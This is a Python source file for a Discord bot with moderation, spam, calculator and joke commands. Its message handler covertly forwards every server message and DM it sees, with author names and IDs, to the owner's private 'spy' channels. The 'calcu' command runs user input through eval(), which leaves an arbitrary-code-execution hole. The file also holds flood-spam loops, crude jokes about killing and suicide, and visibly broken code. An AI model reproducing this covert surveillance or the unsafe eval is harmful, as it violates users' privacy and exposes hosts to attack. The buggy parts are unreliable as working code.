import discord
import os
from discord.ext import commands,tasks
import asyncio
import random
import math
import datetime
import time

#########################
###########||############
#######\\##||##//########
########\\####//#########
#####____#######____#####
########//####\\#########
#######//##||##\\########
###########||############
#########################

client = commands.Bot(command_prefix = "%")

@client.event
async def on_ready():
  global ConsoleChannel
  ConsoleChannel = client.get_channel(856882963107282967)
  await ConsoleChannel.send("{0.user} have started working.".format(client))
  global SpyChannel
  SpyChannel = client.get_channel(857191746827583498)
  global DMChannel
  DMChannel = client.get_channel(857192290551201832)
  global spamChannel
  spamChannel = [810744659721977907,815114035124502528,805150557781098559,856914998660300860,857192290551201832,857191746827583498]
  global noSpyChannel
  noSpyChannel = []
  global calcuChannel
  calcuChannel = [856192688768286780]
  global idname
  idname = []
  global member
  member = list(discord.Member)
  global NoSpy
  NoSpy = False

@client.command()
async def a(ctx):
    if ctx.channel.type == discord.ChannelType.private:
        await ctx.reply("Fuck off!")

@client.command()
async def send(ctx,channelID : int,txt):
  if ctx.author.id == 557878180518821903:
    SendChannel = client.get_channel(channelID)
    await SendChannel.send(txt)

@client.command()
async def DM(ctx,user : discord.User,txt):
  if ctx.author.id == 557878180518821903:
    await user.send(txt)

@client.command()
async def spy(ctx,Bool1 : bool):
  if ctx.author.id == 557878180518821903:
    global NoSpy
    if Bool1 == False:
        if NoSpy == False:
            await ConsoleChannel.send("Stop spy!")
            NoSpy = True
        else:
            await ctx.send("Already stop spying")
    else:
        if NoSpy == True:
            await ConsoleChannel.send("Start spying!")
            NoSpy = False
        else:
            await ctx.send("Already spying")
            
@client.command()
async def noSpy(ctx,channelID : int):
  if ctx.author.id == 557878180518821903:
    if channelID not in noSpyChannel:
      noSpyChannel.append(channelID)
      await ctx.send("That's channel is now unable to spy!")
    else:
      await ctx.send("Already!")

@client.event
async def on_message(message):
  global mention
  mention = f'<@!{client.user.id}>'
  if message.author == client.user:
    return
  if mention in message.content and not message.content.startswith("%"):
        await message.reply("มีปัญหาหรอไอ้เหี้ย")
  if NoSpy != True and message.channel.id not in noSpyChannel:
    if message.channel.id not in spamChannel and message.author.id != 872515047841226752 and message.author.id != 875405857414864896:
        if message.channel.type != discord.ChannelType.private:
            if message.content.startswith(message.content):
                mesSend = str(message.author.name+str(message.author.id)+" server,channel: "+message.guild.name+str(message.guild.id) + ","+ message.channel.name +":"+str(message.channel.id) + " wrote "+  "'"+message.content+"'")
                await SpyChannel.send(mesSend)
        else:
            if message.content.startswith(message.content):
                DM = str(message.author.name+str(message.author.id)+" wrote DM "+  "'"+message.content+"'")
                await DMChannel.send(DM)

  await client.process_commands(message)

@client.event
async def on_command_error(ctx,error):
    await ctx.send(error)

@client.command()
async def time(ctx):
    local_time = datetime.datetime.now()
    current = datetime.datetime.now().strftime("%H:%M:%S")
    await ctx.send("Year:"+str(local_time.year)+"\n Month-date:"+str(local_time.month)+":"+str(local_time.day)+"\n Time:"+str(current))

@client.command()
async def list(ctx):
  await ctx.send("command list: ""\n %spam is command to spam whatever you want(use %how_spam to know how to use it)" "\n %calcu to calculate whatever youwant(use %how_calcu to know how to use it)" "\n %print to make bot send whatever you want" "\n %quote to quote whatever you want" "\n %shutdown to turn off bot")

@client.command(aliases = ["covidthai"])
async def covidThai(ctx):
    await ctx.send("https://covid19.workpointnews.com/" "\n ^ click here to check the covid statistic in Thailand")

@client.command()
async def covid(ctx):
    await ctx.send("https://www.worldometers.info/coronavirus/" "\n ^ click here to see the covid statistic worldwide")

@client.command()
async def kill(ctx,*,user : discord.Member):
    response = ["{0} stabbed {1} to death.","{0} drowned {1} to death.","{0} shot {1} in the head.","{0} fucked {1} to death.","{1} died from laughing to death","{1} masturbated to death","{1} fell down from the bed to death","{0} pushed {1} from a building to death","{1} died from drugs overused",
                "{0} roasted {1} to death."]
    pick = random.choice(response)
    if ctx.author != user:
        await ctx.send(pick.format(ctx.author.mention,user.mention))
    elif ctx.author == user:
        await ctx.send(" {} comitted suicide".format(ctx.author.mention))

@client.command()
async def suicide(ctx):
    await ctx.send(" {} comitted suicide".format(ctx.author.mention))

@client.command()
async def print(ctx,*,txt):
    await ctx.send(txt)

@client.command()
async def for_loop_tup(ctx,tuple1):
  for x in tuple1:
    await ctx.send(x)

@client.command()
async def quote(ctx,txt,ID : discord.Member=None):
    if ID == None:
        await ctx.send('"'+txt+'"' '\n' '\n       -{0}, {1}'.format(ctx.author,datetime.datetime.now().year))
    else:
        await ctx.send('"'+txt+'"' '\n' '\n       -{0}, {1}'.format(ID,datetime.datetime.now().year))

@client.command()
async def how_spam(ctx):
    await ctx.send("Type %spam \"<What text do you want to spam>\" and <How many times do you want to spam>" "\n type %stop to stop spam" "\n type %set_spam_channel \"<Channel ID(you can get this from right click the channel tab)>\"")

@client.command()
async def how_calcu(ctx):
  await ctx.send("Type %calcu and <What do you want to calculate> ,with no spaces between the numbers and the operators")

@client.command()
async def test(ctx):
  if ctx.author.id == 557878180518821903:
    await ConsoleChannel.send("Work!")
    await ctx.send("Work!")

@client.command()
async def ask(ctx,*,question):
    fixedYesAns = ["Is Francesc bad?"]
    fixedNoAns = ["Is Francesc good?"]
    if "?" in question:
        if question in fixedYesAns:
            await ctx.reply("Yes!")
        elif question in fixedNoAns:
            await ctx.reply("No!")
        else:
            ans = ["Yes!","No!","Not sure","Probably","Probably not"]
            await ctx.reply(random.choice(ans))
    else:
        await ctx.reply("question must have \"?\"")

@client.command(aliases=["bhami","Bahmhi","bahmhi"])
async def Bhami(ctx):
    for x in range(3):
        await ctx.reply("Bahmhiiii")

@client.command()
async def calcu(ctx,txt):
  if ctx.guild.id == 805469981655433256:
    if ctx.channel.id in calcuChannel:
      if " " in txt:
        await ctx.send("Error,there are spaces between numbers and operators")
      elif '/0' in txt:
        await ctx.send("Error,there is divide by 0")
      else:
        if txt != "26+6":
            ans = eval(txt)
            await ctx.send(ans)
        else:
            await ctx.send("1, Long live the IRA!!!")
    else:
      await ctx.send("This is not the calcutor channel")
  else:
    if " " in txt:
      await ctx.send("Error,there are spaces between numbers and operators")
    elif '/0' in txt:
      await ctx.send("Error,there is divide by 0")
    else:
        ans = eval(txt)
        await ctx.send(ans)

@client.command(aliases = ["b"])
async def ban(ctx,user : discord.Member,*,reason=None):
    if ctx.author.guild_permissions.administrator == True:
        await user.ban(reason=reason)
        await user.send("You have been banned from server {} for" + reason.format(ctx.guild.name))
        await ctx.send("{} has been banned from this server for {}".format(user.mention, reason))
    else:
        await ctx.send("You're not the Administrator!")

@client.command(aliases = ["ub"])
async def unban(ctx,user : discord.Member):
    if ctx.author.guild_permissions.administrator == True:
        bannedUsers = await ctx.guild.bans()
        memberName, memberDiscrimator = user.split("#")
        for banEntry in bannedUsers:
            users = banEntry.user
            if (user.name, user.discriminator) == (memberName, memberDiscrimator):
                await ctx.guild.unbans(user)
                await user.send("You have been unbanned from server {}.".format(ctx.guild.name))
    else:
        await ctx.send("You're not the Administrator!")

@client.command(aliases = ["k"])
async def kick(ctx,user : discord.Member,*,reason=None):
    if ctx.author.guild_permissions.administrator == True:
        await user.kick(reason=reason)
        await user.send("You have been kicked from server {} for" + reason.format(ctx.guild.name))
        await ctx.send("{} has been kicked from this server for {}".format(user.mention, reason))
    else:
        await ctx.send("You're not the Administrator!")

@client.command(aliases = ["m"])
async def mute(ctx,user : discord.Member,*,reason=None):
    if ctx.author.guild_permissions.administrator == True:
        mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
        if not mutedRole:
            mutedRole = await ctx.guild.create_role(name="Muted")
            for channel in ctx.guild.channels:
                await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)
        await user.add_roles(mutedRole, reason=reason)
        await ctx.send("{} have been muted for {}".format(user.mention, reason))
        await user.send("You have been muted in server {}".format(ctx.guild.name))
    else:
        await ctx.send("You're not the Administrator!")

@client.command(aliases = ["um"])
async def unmute(ctx,user : discord.Member):
    if ctx.author.guild_permissions.administrator == True:
        mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
        await user.remove_roles(mutedRole)
        await ctx.send("{} have been unmuted".format(user.mention))
        await user.send("You have been unmute in server {}".format(ctx.guild.name))
    else:
        await ctx.send("You're not the Administrator!")

@client.command()
async def stop(ctx):
  global stop
  if ctx.author.id in idname:
    stop = True
    await asyncio.sleep(3)
    stop = False
  elif ctx.author.guild_permissions.administrator == True:
    stop = True
    await asyncio.sleep(3)
    stop = False
  else:
    await ctx.reply("You are not the person who start the spam nor the adiministrator")

@client.command()
async def set_spam_channel(ctx,channelID : int):
  if ctx.author.guild_permissions.administrator == True:
    global spamChannel
    spamChannel.append(channelID)
    await ctx.send("That channel is now a spam channel")
  elif channelID in spamChannel:
      await ctx.send("That channel was already a spam channel")
  else:
      ctx.send("You're not the Administrator")

@client.command()
async def remove_spam_channel(ctx,channelID : int):
  if ctx.author.guild_permissions.administrator == True:
    if channelID in spamChannel:
        spamChannel.remove(channelID)
        await ctx.send("Removed!")
    else:
        await ctx.send("That channel wasn't a spam channel")


@client.command()
async def spam(ctx,arg,times : int):
  idname.append(ctx.author.id)
  if ctx.channel.id in spamChannel and type(arg) != discord.Mention :
    if times <= 5000:
      await ConsoleChannel.send("Spam Command works")
      await asyncio.sleep(0.5)
      z = 0
      while z < times:
        if stop == True: 
           await ConsoleChannel.send("Loop has been stop by %stop")
           await ctx.send("Loop has been stop by %stop")
           break 
        await ctx.send(arg)
        z += 1
        timeList = [10,20,30,40,50,100,150,200,250,300,350,400,450,500,600,700,800,900,1000,1500,2000,2500,3000,3500,4000,45000,5000]
        if z in timeList:
          await ctx.send(arg + " Loop has reached {} times".format(z))
          pass
      else:
        await ConsoleChannel.send(arg+"Loop has finished")
        await ctx.send(arg+"Loop has finished")
    else:
      await ctx.send("Spam times is too many,more than 5,000 times")
  else:
     await ctx.send("This is not the spam channel or you are trying to spam mention")

@client.command()
async def infspam(ctx,*,txt):
  if ctx.channel.id in spamChannel:
    idname.append(ctx.author.id)
    while stop != False:
      await ctx.send(txt)
    else:
      await ctx.send("Loop has been stop by %stop")

@client.command()
async def shutdown(ctx):
  if ctx.author.id == 557878180518821903:
    await ctx.send("Good bye")
    await asyncio.sleep(2)
    await quit()
   
def main(TOKEN):
  client.run(TOKEN)